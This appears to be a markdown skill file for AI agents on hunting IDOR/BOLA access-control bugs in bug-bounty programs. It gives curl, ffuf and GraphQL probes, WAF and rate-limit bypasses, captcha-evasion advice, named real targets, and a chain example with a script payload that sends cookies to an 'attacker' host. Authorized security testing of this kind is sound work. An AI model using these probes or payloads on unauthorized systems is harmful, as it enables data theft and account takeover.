---
name: hunt-idor
description: Hunting skill for idor vulnerabilities. Built from 26 public bug bounty reports. Use when hunting idor on any target.
sources: github, hackerone_public
report_count: 39
---
> **appsec-fyi supplement (source-cited, 2026 CVEs):** `references/appsec-fyi-techniques.md` —
> additive per-class technique list from https://appsec.fyi. Owner methodology below still wins.

> **Extra attack variants** (OpenEMR + PHP-core advisories — see §A): `skills/security/exploit-cookbook/references/openemr-php-advisory-techniques.md`


## Crown Jewel Targets

**Why IDOR pays big:**
- Direct access to other users' data without authentication bypass — clear, demonstrable impact
- Chains easily with privilege escalation, financial fraud, and account takeover
- Affects virtually every application with user-owned resources

**Highest-value asset types (by payout potential):**

| Asset Type | Why It Pays |
|---|---|
| Financial documents / billing APIs | PII + financial data exposure (Shopify, Uber, PayPal) |
| Private repositories / source code | IP theft, critical data loss (GitHub) |
| User messages / DMs | Privacy violation at scale (Reddit) |
| Account management endpoints | User addition, deletion, privilege escalation (PayPal, Mozilla) |
| Business/org administration | Cross-tenant escalation, employee PII (Uber) |
| Content moderation/admin actions | Operational sabotage (Reddit mod logs) |

**Programs that pay most for IDOR:**
- Platforms with multi-tenancy (SaaS, B2B tools)
- Fintech and payment processors
- Social platforms with private content
- Developer tools with org/repo isolation

---

## Attack Surface Signals

**URL patterns that scream IDOR:**
```
/api/v1/users/{id}/
/api/v*/orders/{order_id}
/invoices/download?id=
/reports/{uuid}/
/messages/{thread_id}
/admin/orgs/{org_id}/members
/migration/{migration_id}/files
/graphql (query params with IDs)
/api/business/{business_id}/
/vouchers/{voucher_id}/policy
```

**Response header signals:**
- `Content-Type: application/json` on endpoints accepting raw IDs
- No `X-Frame-Options` or CORS misconfigs paired with ID params
- `Authorization: Bearer` tokens that are user-scoped but hit org-level resources

**JavaScript source patterns:**
```javascript
// Look for hardcoded or interpolated IDs in JS
fetch(`/api/v1/users/${userId}/profile`)
axios.get('/invoices/' + invoiceId)
graphql query { billingDocument(id: $docId) }
// Redux/state stores exposing foreign IDs
state.currentUser.organizationId
```

**Tech stack signals:**
- GraphQL endpoints (query-based IDORs are often missed)
- REST APIs with sequential integer IDs (most vulnerable)
- UUIDs that are predictable or leaked in other responses
- Multi-tenant SaaS apps with `org_id`, `account_id`, `business_id` params
- Mobile apps (Burp the APK — mobile APIs often skip authorization checks)

---

## Step-by-Step Hunting Methodology

1. **Map all object references in the application**
   - Browse every feature authenticated as User A
   - Capture all requests in Burp Suite
   - Filter for requests containing: `id=`, `_id=`, `uuid=`, `/v1/{noun}/{id}`, query params with numeric/UUID values

2. **Enumerate ID types**
   - Sequential integers → enumerate ±1, ±100
   - UUIDs → check if they appear in other responses or JS files
   - Hashed IDs → check if leaked in public endpoints, metadata, or GraphQL introspection

3. **Create two separate accounts (same privilege level)**
   - User A: resource owner
   - User B: attacker account
   - Log all IDs belonging to User A while authenticated as User A

4. **Replay User A's resource IDs as User B**
   - Replace session cookie/token with User B's credentials
   - Send identical requests referencing User A's object IDs
   - Test ALL HTTP verbs: GET, POST, PUT, PATCH, DELETE on each endpoint

5. **Test cross-tenant/cross-org scenarios**
   - Create accounts in separate organizations/businesses
   - Test if Org B's session can reference Org A's IDs
   - Pay special attention to admin/management endpoints

6. **Test GraphQL specifically**
   - Run introspection: `{ __schema { queryType { fields { name } } } }`
   - For every query/mutation taking an `id` argument, substitute another user's ID
   - Test both queries (read) and mutations (write/delete)

7. **Test write/destructive operations, not just reads**
   - Can User B DELETE User A's resources?
   - Can User B MODIFY User A's content?
   - Can User B ADD themselves to User A's account?

8. **Chain IDORs together**
   - Use one IDOR's leaked data (org IDs, user IDs) to fuel the next
   - IDOR → leaked ID → second IDOR → privilege escalation

9. **Test state-changing edge cases**
   - Expired tokens/invites that can still be accepted
   - Race conditions on resource IDs
   - Indirect references: `?sort=id` or `?filter[user_id]=`

10. **Document the exact differential**
    - Confirm User B has NO legitimate access to User A's resource
    - Screenshot/log the 200 OK vs expected 403/404

---

## Payload & Detection Patterns

**Basic IDOR test with curl (swap cookie/token):**
```bash
# Get User A's resource ID while authenticated as A
curl -s -H "Cookie: session=USER_A_SESSION" \
  https://target.com/api/v1/invoices/12345

# Replay with User B's session
curl -s -H "Cookie: session=USER_B_SESSION" \
  https://target.com/api/v1/invoices/12345

# Success = 200 OK with User A's data
```

**GraphQL IDOR test:**
```bash
curl -s -X POST https://target.com/graphql \
  -H "Authorization: Bearer USER_B_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ billingDocument(id: \"USER_A_DOC_ID\") { id amount pdfUrl } }"}'
```

**Enumerate sequential IDs with ffuf:**
```bash
ffuf -u "https://target.com/api/v1/orders/FUZZ" \
  -w ids.txt \
  -H "Authorization: Bearer USER_B_TOKEN" \
  -mc 200 \
  -o idor_results.json
```

**Generate sequential ID wordlist:**
```python
# Generate IDs around a known value
known_id = 48291
with open("ids.txt", "w") as f:
    for i in range(known_id - 500, known_id + 500):
        f.write(str(i) + "\n")
```

**Burp Intruder payload for IDOR scanning:**
```
GET /api/messages/§12345§ HTTP/1.1
Host: target.com
Authorization: Bearer USER_B_TOKEN

# Mark §12345§ as injection point
# Use numeric sequential payload: 12000-13000
# Filter responses by length difference or status 200
```

**JavaScript scraping for leaked IDs:**
```bash
# Find IDs in JS bundles
curl -s https://target.com/static/app.js | grep -Eo '"id":"[a-f0-9-]{36}"' | sort -u

# Find object references in API responses
curl -s -H "Cookie: session=USER_A" \
  https://target.com/api/v1/dashboard | python3 -m json.tool | grep -i "_id"
```

**Grep patterns for source code review:**
```bash
# Missing authorization checks in common frameworks
grep -r "findById\|findOne\|getById" --include="*.js" .
grep -r "params\[:id\]\|params\['id'\]" --include="*.rb" .
grep -r "request\.args\.get\('id'\)" --include="*.py" .

# Look for direct ORM queries without user scoping
grep -r "Model\.find(params" --include="*.js" .
# vs secure pattern: Model.find({ id: params.id, userId: req.user.id })
```

**IDOR via HTTP method tampering:**
```bash
# Try undocumented methods
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  echo "=== $method ==="
  curl -s -X $method \
    -H "Authorization: Bearer USER_B_TOKEN" \
    https://target.com/api/v1/users/USER_A_ID/profile
done
```

---

## Common Root Causes

1. **Missing ownership check in ORM queries**
   ```javascript
   // VULNERABLE: fetches any record
   const invoice = await Invoice.findById(req.params.id);
   
   // SECURE: scopes to authenticated user
   const invoice = await Invoice.findOne({ _id: req.params.id, userId: req.user.id });
   ```

2. **Authorization at the route level, not object level**
   - Developer checks "is user logged in?" but not "does this user own this object?"
   - Middleware confirms authentication; individual handlers skip ownership validation

3. **Trusting client-supplied IDs in request bodies**
   - Mobile apps or SPAs send `org_id` in POST body; server uses it directly without verifying caller belongs to that org

4. **GraphQL resolvers without field-level authorization**
   - Query resolvers fetch by ID from database without checking if the requesting user has permission
   - Especially common when resolvers are auto-generated from schema

5. **Inconsistent authorization across HTTP verbs**
   - GET endpoint is protected; POST/DELETE on same resource path is not
   - Common in APIs built incrementally by different developers

6. **Indirect references exposed via related objects**
   - Object A (accessible) contains a reference to Object B (should be private)
   - Developer only protects direct access to B, not indirect references through A

7. **Race conditions and state-based IDORs**
   - Authorization checked at creation time, not at access time
   - Invites/tokens remain valid after the granting permission is revoked

8. **Multi-tenant isolation failures**
   - Developers implement per-user access control but forget cross-org boundaries
   - `user_id` check present; `org_id` / `tenant_id` check absent

---

## Bypass Techniques

**Defense: UUIDs instead of sequential integers**
- Bypass: UUIDs often leak in other API responses, notification emails, webhooks, GraphQL queries, or JS source
- Technique: Harvest UUIDs from accessible endpoints, then replay against restricted ones

**Defense: Indirect/hashed object references**
- Bypass: Decode the hash (often base64 or simple obfuscation), or find the original ID in another response
- Technique: `echo "dXNlcl8xMjM0NQ==" | base64 -d` → `user_12345`

**Defense: Short-lived tokens per resource**
- Bypass: Tokens sometimes reusable across users if server only validates token format, not binding
- Technique: Use your own token to access another user's resource ID

**Defense: Rate limiting on enumeration**
- Bypass: Slow enumeration (1 req/5s), use distributed IPs, or exploit non-enumeration IDORs (you already know the target's ID from another leak)

**Defense: Checking `user_id` in WHERE clause**
- Bypass: Check if the same endpoint exists at a different API version (`/v1/` vs `/v2/`) — authorization logic is often version-specific
- Technique: Check JS bundles for older API version calls

**Defense: CORS restrictions**
- Bypass: IDOR doesn't require cross-origin exploitation — you're testing API endpoints directly with your own session

**Defense: "Opaque" references via server-side sessions**
- Bypass: Look for any endpoint that *returns* the internal ID, then use it elsewhere; APIs often expose IDs in `Location` headers, error messages, or metadata

**Defense: Parameter filtering/WAF on common patterns**
- Bypass: Try nested JSON `{"data": {"id": "VICTIM_ID"}}`, HTTP parameter pollution `?id=own_id&id=victim_id`, or parameter name variations `user_id`, `userId`, `uid`, `account` — plus two ID-shape injections: (1) **HTTP method override** (`X-HTTP-Method-Override: DELETE`, `X-Method-Override: PUT`, `_method=DELETE`) — verb yang authz-nya bolong dibuka walau GET/POST terlihat rapi; dan (2) **null-byte / array on the id value** (`id[]=own&id[]=victim`, `id=victim%00`, duplicate `id=A&id=B`, nested `{"id":[123,456]}`) — framework memakai elemen terakhir di validasi tapi semua di query (atau sebaliknya). Selalu pair dengan own-object control: own id → 200, victim id → 403/404; kalau override/shape membalik status itu, itulah IDOR-nya.

---

## Opaque/checksummed ids: you don't crack them, you HARVEST them

"Defense: the ids are opaque and have a checksum" reads like a dead end and usually is not. Blind
enumeration dies (mutating one character of a valid id returned 0/69 valid; random ids → `Invalid ID`),
but **you never needed to enumerate** — you need a supply of real ids, and apps leak ids in URLs.

1. **Harvest ids from passive archives + the public crawl of every host in the brand.** The app publishes
   share/permalink URLs and they get archived:
   ```bash
   (echo target.com; echo app.target.com) | gau --threads 5 --subs > gau.txt
   grep -oiE '/(shared/)?(questions|session|sessions|r|s|share|doc|file|invoice)/[A-Za-z0-9_-]{6,24}' gau.txt \
     | grep -oE '[A-Za-z0-9_-]{6,24}$' | sort -u            # one pass -> 230 session ids, 5,082 /questions/ URLs
   katana -u https://app.target.com -d 3 -jc -kf all -o katana.txt
   ```
2. **Expand each harvested id with an unauthenticated "share / public / preview" resolver.** These exist to
   be callable by non-members, so they often carry no auth at all — and they return the *child* object ids:
   ```graphql
   { sharedQuestionSessionFromQuestionSession(eid:"<harvested-session-id>") { title questions { eid } } }
   ```
   230 session ids → 5,245 child object ids, no account required. Repeat the pattern one level down if the
   child type has its own public/permalinked route.
3. **Then the actual authz bug** (whatever it is — ungated sibling field, unscoped resolver, cross-user read)
   is suddenly mass-exploitable instead of one-object-at-a-time.

**Severity framing that survives triage:** do *not* downgrade on "the ids aren't guessable". The correct
statement is "ids are not blind-enumerable, but N of them are published/archived at these URLs and each one
expands to M objects via an unauthenticated resolver" — quantify N and M. Blast radius scales with the
**published URL surface**, which the vendor can actually fix (drop the ids out of share URLs / gate the
share resolver), not with id entropy, which they cannot.

**Also probe the same id in the share path vs the direct path.** A resolver named `getSharedX` /
`publicX` / `previewX` that returns a foreign session's title + child ids with **no auth header** is a
reportable access-control gap on its own — and it is the id-supply for whatever else you find.

Worked example with measured numbers and copy-paste probes:
`hunt-graphql` → `references/field-level-authz-and-id-harvest-chain.md`.

## Multi-Tenant Boundary Proof (negative results that stand up)

Before writing "no cross-tenant access", prove the *whole* boundary, not just the obvious object pages:

1. **Both directions.** Tenant B → A's ids AND A → B's ids. A privileged/admin plan may have extra
   reach a plain account does not (and vice versa). Confirm each credential's identity first — a stored
   session cookie and a handed-over API key are frequently DIFFERENT accounts.
2. **Hit every surface that returns a whole object as a FILE.** Per-object export endpoints
   (`/api/<noun>/{id}/export?format=pdf|xlsx`) are the highest-value read path and are usually missed by
   page-level checks. Also: aggregate exports, firm/client CSVs.
3. **Try tenant overrides explicitly** — headers (`X-Account-Id`, `X-User-Id`, `X-Client-Id`,
   `X-Organisation-Id`, `X-Firm-Id`, `X-Tenant-Id`) and query params (`accountId`, `clientId`,
   `userId`, `sourceId`, `includeShared`, `all`, `debug`). Compare response LENGTH to the
   un-overridden call; an identical size = ignored.
4. **Check the authenticated response isn't cached publicly.** Fetch an authenticated file, then fetch
   the SAME URL with no cookie: you must get a redirect/401, never the file. `CF-Cache-Status: DYNAMIC`
   plus a no-cookie redirect is the clean result.
5. **Check for an existence oracle.** Compare the response body for (own id, foreign valid id, random
   id). Byte-identical 404s = no enumeration oracle. If a foreign id and a random id differ in status or
   body, you have a *user/resource enumeration* finding even when no data leaks.
   On **sequential integer ids** the tell is often `foreign id → 403/401` vs `non-existent id → 200-empty
   (default/blank template)`. Read the 403 as the *positive* "this id EXISTS and belongs to someone else"
   signal, not "blocked, move on" — the gaps returning 200-empty are what make the whole id space mappable.
   Prove sequentiality by creating your own object and reading ±1 (worked: form ids 920498/920499/920500
   consecutive; own→200, neighbors→403, +1 gap→200-empty). Even with no data leak this is a reportable
   enumeration finding — just label it Low and say it doesn't meet an "expose user data" bar.
6. **Verify writes with an independent oracle**, not the success toast — the object's export, or the
   other tenant's own session. And pair every rejection with a positive control on an OWNED object:
   "no-op" without a control is indistinguishable from "my request never reached the server".
7. **Caller-supplied-id ops: record all THREE cells before concluding.** For any GraphQL/REST op that
   takes a user/object id argument (e.g. `FavouriteStreams(userId:<uuid>)`), capture (a) unauth + own id,
   (b) auth + own id, (c) auth + a FOREIGN id. `(b) ≠ (a)` proves a session is required; `(c)` returning
   the other user's data proves the BOLA. The trap: an op that returns the SAME empty result for every id
   is indistinguishable from an ownership check **until a second account exists AND owns state** — close a
   real BOLA as "no leak" and you've burned the finding. Build account B and give it a record BEFORE testing.
   Confirmed real case: `FavouriteStreams` on a public GraphQL path, auth-gated but not ownership-checked —
   attacker A read victim B's favourites by passing B's userId (control A→A returned A's own).
8. **Second-account logistics (when you must prove cross-user):** if a disposable-email provider throttles
   a 2nd mailbox (`/token` → 401 xN), register account B on a **Gmail `+alias`** of an inbox you control
   (delivered to the same mailbox) and read the verification mail through the provider's API. Target
   self-registration is often captcha-gated; an **invisible** reCAPTCHA (`size=invisible`) passes on a
   clean stealth-browser fingerprint with no interaction — see the `camoufox` skill. Use a separate
   cookie jar per account (camofox `userId` isolates jars; `sessionKey` does NOT).

Full matrix, oracle recipes and the cleanup pass: `server-actions-auth-audit` →
`skills/security/server-actions-auth-audit/references/tenant-boundary-matrix-and-ledger-oracles.md` (plus its
`skills/security/server-actions-auth-audit/scripts/tenant_boundary_probe.py` for the mechanical part).

---

## Caller-supplied ids on a public GraphQL path (BOLA-by-resolver)

Modern SPAs expose read APIs on a **public** GraphQL path (`/api/pub/gql/...`, often Apollo APQ:
`/<Operation>/<sha256-of-query>?variables={...}`). Each operation is its own resolver, so the same app
can be scoped correctly in one and leak in the next. This is where the cheapest BOLA lives.

**Find the operations, then ask of each one: does it take an id, and whose id?** Harvest the op list from
the logged-in session's own traffic — `performance.getEntriesByType('resource')` filtered to `gql`
(the request URLs carry op name + hash + variables), no introspection needed. Then classify every op:
- takes a **caller-supplied object id** (`{"userId":...}`) → prime BOLA candidate;
- takes **no id / a content id** (page path, stream name, city) → public content, skip;
- takes **no id at all** → session-scoped by construction.

**The sibling-op contrast — this is the report's spine.** When one resolver honours a caller-supplied id
while a sibling on the same API ignores it and returns the session principal, you have proof the leak is a
**per-resolver oversight, not design intent**, and the correct pattern already exists in the codebase.
Worked example (CH Media / Sunshine Radio, 2026-10):
- `FavouriteStreams?variables={"userId":"<ANY_UUID>"}` → returned **that** user's favourites. IDOR.
- `UserProfile?variables={}` **and** `{"userId":..}` **and** `{"id":..}` → always the caller's own profile.
  Variable ignored → correctly session-scoped.
That contrast (same product, adjacent resolvers, opposite behaviour) is stronger than the leak alone and
tells the vendor exactly where to copy the fix from.

**The auth-gate discriminator that forces a second account.** For an op that takes an id, compare
`UNAUTH + id` against `AUTH + id`:
- `UNAUTH + own id` → empty **and** `AUTH + own id` → real data ⇒ **an auth gate exists**. Do not stop here.
- At this point "userId is an ownership check that must match the session" and "userId is a lookup behind a
  mere auth gate" produce **identical** observations for any id that has no objects. They are
  indistinguishable without a **second account that owns something** (see step 3 above).
So: build the second account and give it state *before* claiming BOLA — otherwise record it as
**suspected, unconfirmed** and say why. Confirming it: from A's session request B's id → B's object
appears; control A→A returns A's own, different object (that differential is the whole finding).

**Write-side symmetry (cheap, often a clean negative):** if the read leaks by id, immediately replay the
matching **write**. If the mutation carries only the object's own natural key (`onAirId`) and no user id,
it writes to the session principal and there is no write-IDOR. Also probe the write's own logic while you
are there — garbage key → 400 (validation present), duplicate key → 400 with the count unchanged
(idempotent), foreign-brand key → accepted by design. A validated, idempotent, session-scoped write is a
"verified working" line in the report, not a gap.

**Severity honesty:** caller-supplied-id read leaks on a UUID that is not enumerable and exposes
low-sensitivity data are **Low** (argued Medium) — say so, and note that impact rises only if a userId
leak exists elsewhere or the same pattern reaches a sensitive per-user object.


---

## APQ GraphQL: the caller-supplied-id IDOR (persisted-query APIs)

Modern GraphQL is often served as **persisted operations only** (Apollo APQ): the client calls
`GET /api/<...>/gql/<skin>/<OperationName>/<sha256>?variables={...}` and the server rejects any hash it does not
know — `{"errors":[{"message":"PersistedQueryNotFound"}]}`. You cannot introspect or send free queries. So the hunt
becomes: **enumerate the operations the logged-in app itself uses, then test every one that takes an id.**

1. Enumerate ops from the LIVE session — no proxy needed:
   ```js
   performance.getEntriesByType('resource').map(e=>e.name)
     .filter(n=>/gql/i.test(n))     // -> /gql/<skin>/<Op>/<hash>?variables={"userId":"..."}
   ```
   Persisted-query URLs also leak into archives — a `waymore`/`gau` crawl of the host surfaces them
   (`/api/pub/gql/<skin>/<Op>/<40-hex>`). Harvest hashes from both, then replay each.
2. Split the paths: `/api/auth/gql/...` (auth-gated → 401 without a session) vs `/api/pub/gql/...` ("public", but
   often still needs a session and returns an empty default without one). Test the pub ones unauthenticated first.
3. For every op whose variables include an id (`userId`, `id`, `orgId`, ...), replay from the ATTACKER session with
   the VICTIM's id. **The differential IS the finding**: an op that HONOURS the caller-supplied id and returns the
   victim's object = BOLA; an op that IGNORES the variable and always returns the session user's object = safe.
4. Two accounts are mandatory for a verdict, and the victim account needs real state (add a favourite, then read it
   back by id from the other session). A `200 {"streams":[]}` is NOT a finding until you've proven the victim's id
   returns actual data. Pair every cross-user request with an owner-request control.
   - **Provisioning the 2nd account:** disposable-mail APIs throttle a second mailbox from the same IP (mail.tm
     returns 401 on the 2nd `/token`). Fall back to a **Gmail `+alias`** of an account you control
     (`you+tag@gmail.com`) and read the verification mail via the Gmail API (`gmail/v1/users/me/messages?q=to:...`).
     For a browser-driven signup, isolate the second session in its own browser profile (Camofox: a distinct
     `userId` = separate cookie jar; `sessionKey` does NOT isolate cookies).
5. Contrast inside one API is normal — record it. Real example: on the same target `FavouriteStreams(userId)` honoured
   the id (BOLA, victim's favourite returned) while `UserProfile` ignored `userId`/`id` and always returned the caller's
   own profile. One resolver forgot the per-object check, the other didn't; naming which is which strengthens the report.

Remember: an auth gate on the endpoint says nothing about object ownership on the resolver. "Is there a session?" and
"is THIS object mine?" are different checks, and resolvers are written field-by-field.

## The ack is not the oracle — re-read the victim's object (false-success trap)

Servers sometimes answer `{"Succeeded":true,"Message":"...erfolgreich..."}` to cross-account
mutations whose authorization check silently no-ops (verified: finanzen.net `/user-api/depots.asp`
`delete` AND `rename` returned full success for another account's ids while NOTHING changed —
3 interleaved runs each). Symmetrically, a success toast on YOUR side proves nothing about a
victim object. Protocol for every cross-account mutation:

1. Seed victim account B with a **MARKER object** you control (name it `IDORPROBE_R1`) — the
   marker is what makes "changed" vs "unchanged" decidable on B's own page.
2. Attacker A sends the mutation with B's id; keep the ack VERBATIM as evidence of *behaviour*,
   never as evidence of *effect*.
3. **Re-read B's own rendered list/page** and diff against pre-state (id present? marker renamed?).
4. Interleave **A → own-object positive control + A → B cross call**, three rounds with sleeps.
   The own-object control is non-negotiable: a dead session turns BOTH into a login redirect, which
   fabricates a false IDOR on one reading and masks a real one on the other.
5. Anonymous/no-cookie control on the same endpoint → expect redirect/401.

Verdicts: cross changes victim state = IDOR (file it); ack success + no state change =
authorization HOLDS — the false-success response is at most a monitoring/evasion hardening note,
never an IDOR; both own and cross fail = session dead, re-login before concluding anything. A
cross-account redirect-to-login that masks a 403 is likewise NOT proof of authz until the
own-object control passes in the same minute.

## Naikkan severity — komposisi K/A/B/X (wajib sebelum lapor, added 2026-10-30)

IDOR adalah **X (Amplifier)** yang paling kuat di arsenal: ia mengubah primitif kecil jadi tampilan
aktor lain, atau jadi enumerasi massal. Tapi IDOR sendirian sering dinilai Medium — yang membuatnya
Critical adalah **tepi yang ia hubungkan**.

| Part | Yang ia beri penyerang | Sinyal IDOR yang supply ini |
|---|---|---|
| **K — Knowledge** | identifier / schema | response yang membocorkan id tenant, cursor yang membocorkan filter server-side, error yang menyebut field |
| **X — Amplifier** | primitif kecil → banyak / tampilan aktor lain | **IDOR di objek publik → enumerasi ke objek privat**, export yang abaikan filter, cross-tenant identifier acceptance |

Pola komposisi yang **terbukti** dan relevan:

```
K + B + A + X   info-leak (K) → unthrottled enumeration (B) → unverified email change (A)
                → IDOR/export amplification (X)                        =  mass ATO
X + K           IDOR (X) + identifier leak (K)                          =  cross-tenant mass data
X + A           IDOR read (X) + mass-assignment write (A)               =  privilege escalation on victim
X + X           double-IDOR (/users/{id}/orders → /orders/{id}/refund)  =  financial impact on victim
```

Prosedur (jalanin di **0E**, sebelum lapor ditulis): INVENTORY → LABEL → EDGES → SINK → PROVE →
REPORT. **Satu laporan rantai**, judul = impact terminal. IDOR-nya muncul sebagai langkah bernomor.

Skill lengkap: `security/chain-to-impact` (K/A/B/X + 6 pola komposisi) · `exploit-depth` (L0→L5) ·
`lead-to-critical`.

## Minimum 5 probes (wajib sebelum kelas ini boleh N/A)

| # | Probe | Kenapa ini dulu |
|---|---|---|
| 1 | Collection endpoint (`/api/users`, `/api/orders`) **tanpa auth** | Primitive termurah & severity tertinggi |
| 2 | Swap id: objek milik A diakses dengan sesi B, bandingkan **body** | Inti IDOR — selisih body, bukan status |
| 3 | Variasi nama param: `id`/`userId`/`user_id`/`account`/`uid` + HPP (`?id=own&id=victim`) | Nama param bukan standar |
| 4 | Method tampering: GET→POST→PUT→DELETE→PATCH pada endpoint sama | Authz sering cuma di satu method |
| 5 | UUID? **Harvest** dari JS bundle, email, referer, API lain | UUID bukan penghalang kalau bocor |

**Aturan:** pakai `identity_harness.py` untuk probe #1–#2 supaya hasil terukur
(diff JSON dengan sha256). N/A tanpa harness = klaim, bukan bukti.
## OWASP Top 10:2025 anchor + ASVS V8 test plan (added 2026-10-30)

IDOR/BOLA is the core of **A01:2025 Broken Access Control**, still **#1** — 40 CWEs mapped,
**1,839,701 occurrences**, **32,654 CVEs**, and OWASP reports **100% of tested applications had
some form of broken access control**. Highest occurrence count in the entire Top 10.

ASVS 5.0 requirements this class must satisfy (cite the ID in the report):

| ASVS | Lvl | Requirement | Our probe |
|---|---|---|---|
| **8.2.2** | **1** | data-specific access restricted to explicit permissions (IDOR/BOLA) | two-account id swap |
| **8.2.3** | **2** | field-level access restricted (**BOPLA**) | response-field diff + mass-assignment |
| **8.3.1** | **1** | authz enforced at a **trusted service layer**, not a client-manipulable control | canonicalization sweep |
| **8.4.1** | **2** | multi-tenant cross-tenant controls | tenant-substitution sweep |
| 8.3.2 | 3 | authz-decision changes apply **immediately** | revoke role, replay old token |
| 8.3.3 | 3 | access based on the **originating subject**, not an intermediary | confused-deputy / proxy trust |

**Note the 2025 list change:** SSRF (CWE-918) is now mapped **inside A01**, not as its own
category. An SSRF hunt is an access-control hunt — cite A01, not a retired "A10:2021 SSRF".

Full map, score tables, and the 2026 parser-differential probe set:
`security/exploit-cookbook/references/owasp-top10-2025-asvs5-access-auth.md`

## The gate protects the PAGE, not the DATA — unauthenticated renderer/widget routers

The cheapest cross-user read on a CMS/theme/template product is usually not an API at all: it is the
**component renderer** that feeds the gated page. Login walls are enforced on the page route; the
renderer/AJAX route the page calls is frequently unauthenticated, and the component reads the acting
identity from a **cookie or query param** instead of the session.

Shape when you find it:
- `GET /account` (no cookies) → `302 /login?login_direct_url=/account`   ← the "gate"
- `GET /wapi/widget?widget_name=<account widget>&user=1` (no cookies) → `200` + member-1 rows ← bypass
- component source: `if (!isset($_COOKIE['userid'])) $_COOKIE['userid'] = $_GET['user'];`
  (or `getUser($_GET['claim'])`, `getUser($_POST['user_token'])`) with no `isUserLogged` in front

Where to look on any product exposing named components:
- renderer paths: `/wapi/<noun>`, `/api/data/html/get/<noun>/<name>`, `/api/widget/json/get|post/<name>`,
  `?widget=`, `?component=`, `?block=`, `?module=`, `?template=`, `/render?name=`
- inventory them: an admin REST that lists components hands you the whole server-side source in one dump
  (Brilliant Directories: `GET /api/v2/data_widgets/get?limit=100&page=N` → 520 rows, 415 containing `<?php`).
  Grep that dump for `$_COOKIE['userid']`, `$_GET[..._id]`, `$_REQUEST[invoiceid]`, and for components that
  print `email` / `phone_number` — that is the vuln list, already ranked.
- components that DO check (`isUserLogged`, CSRF token, owner compare) are your negative controls; naming
  them proves the leak is an oversight, not design.

**Three-cell discipline:** (1) page unauth → 302/403, (2) renderer unauth + `user=<A>` → 200 with A's rows,
(3) renderer unauth + `user=<B>` → **different** body. Byte-identical bodies across ids = generic shell or
empty datatable = **not** a finding. Record body hashes, 3 runs each.

**Debug echoes are free PoC.** Datatables/renderers often accept `showquery=1`, `debug=1`, `preview=1`,
`raw=1` and return the SQL/JSON they executed, including your supplied id (`WHERE user_id='4242'`). That turns
"it answered 200" into "the server executed a query keyed by attacker input", with zero exploit payloads.

**Never over-claim on empty tables.** On production instances the probed ids may own no rows. Report what was
measured (200 + table structure + query echo + the source line doing it) and label the PII as source-derived.
Escalate honestly: these components usually concatenate SQL (`"`review_status` = ".$_GET[x]`,
`LIKE '%$v%'`), so the IDOR endpoint is also a SQLi primitive — file it as a code-level observation.

**WAF rule (learned the hard way, Brilliant Directories 2026-10):** when that same endpoint smells like SQLi,
do NOT open with `AND 1=1` / `SLEEP()` / `extractvalue()`. On ModSecurity those burn the budget: 403 on the
first payload, then the whole vhost firewalls your egress IP and auto-suspends your test instances. Prove the
identity-trust bug first (cookie/param + query echo + source), then decide whether payloads are worth it.

## Gate 0 Validation

Before writing the report, answer all three:

1. **What can the attacker DO right now?**
   Be specific: "Attacker with a valid account can send a GET request to `/api/v1/invoices/{victim_invoice_id}` and receive the victim's full billing document including name, address, and payment amount — without any relationship to that account."

2. **What does the victim LOSE?**
   Map to CIA triad: confidentiality (data exposed), integrity (data modified), or availability (data deleted). "Victim loses confidentiality of private financial records" or "Victim's content is deleted by a third party" — vague answers fail.

3. **Can it be reproduced in 10 minutes from scratch?**
   - Two fresh accounts created ✓
   - Exact HTTP request documented with victim's ID ✓
   - 200 OK response showing victim's data (or confirmed state change) ✓
   - No reliance on pre-existing state or timing ✓
   
   If you can't demo it reproducibly, do not file the report.

---

## Real Impact Examples

**Scenario 1: Financial Data Exposure + Cross-Account Billing Fraud (Uber-style)**
An attacker discovers two related IDORs: one allows reading any organization's voucher policy configuration (exposing org IDs, employee email lists, and payment methods), and a second allows modifying voucher policies using those leaked IDs. Chained together, this enables the attacker to redirect charges to an arbitrary business account, expose employee PII across organizations, and take over invitation links — all without any elevated privileges beyond a basic user account. Impact: financial fraud + mass PII exposure across the B2B platform.

**Scenario 2: Private Repository Read via IDOR on Migration Endpoint (GitHub-style)**
A migration feature allows users to upload files to a migration job. The `migration_id` parameter is not validated against the authenticated user's ownership. An attacker creates their own migration, observes the ID format, and substitutes another user's private migration ID — gaining read access to source code files from private repositories they have no access to. Impact: complete confidentiality bypass for private intellectual property.

**Scenario 3: Account Takeover Chain via Message IDOR (Reddit-style)**
An attacker accesses another user's private message threads by substituting their `thread_id` in a messaging API endpoint. The response includes message content, metadata, and — critically — session or verification tokens sent via internal messages. The attacker leverages the token found in the messages to perform account recovery steps, escalating a read-only IDOR into full account takeover. Impact: complete account compromise of targeted users at scale.

---

## Chains & Compositions (Senior Hunting)

Standalone IDOR gets paid at Low-Medium for cross-tenant *read*. The real money is in chaining IDOR to a *state-change* primitive that doesn't normally permit cross-tenant action — turning "I can see victim's data" into "I own victim's account". The six chains below are the highest-paying IDOR compositions on modern bug-bounty programs.

### Chain 1 — IDOR on `/api/users/{id}/email` + Missing Re-Auth → Password Reset → ATO

- **A.** Confirm IDOR on the email-change endpoint — request `PUT /api/users/{victim_id}/email {"email":"attacker@evil"}` from attacker's session; server changes the victim's email without ownership check.
- **B.** Hit the password-reset flow on the victim's account — server emails reset link to the **new** email (attacker's).
- **C.** Open reset link, set new password, log in as victim.
- **Impact:** Silent ATO — victim sees no email change notification because the change happens via API not via the user-facing "change email" UI which has its own audit log.
- **Real shape:** Classic ATO pattern across many SaaS bug-bounty disclosures 2018-2024. Cross-refs `hunt-ato` Path 2 (email change without re-auth).

### Chain 2 — IDOR on File-Download + Filename-Controlled `Content-Disposition` → Reflected-XSS-Via-Download → Session Theft

- **A.** IDOR on `/api/files/{id}/download` returns any user's file given the ID.
- **B.** The download endpoint sets `Content-Disposition: attachment; filename="<user-supplied-filename>"` without sanitising newlines or quotes — attacker uploads a file with filename `"; <script>fetch('https://attacker/x?c='+document.cookie)</script>; foo.txt`.
- **C.** Victim navigates to download → browser interprets the injected script in the response header context as HTML → JS runs same-origin → cookie/token exfil.
- **Impact:** ATO via IDOR + filename-controlled response header — neither primitive alone is critical; the chain is.
- **Real shape:** Multiple disclosed cases involving Office 365 SharePoint download endpoints, GitLab attachment downloads, SaaS export endpoints. Pairs with `hunt-xss` Chain 1 (response-header XSS class).

### Chain 3 — IDOR via GraphQL `node(id:)` GID + Relay Relation Traversal → Cross-Tenant Mass Data Extraction

- **A.** Target uses GraphQL with Relay-style global IDs (`gid://shopify/Customer/<n>` or base64-encoded `type:id` patterns).
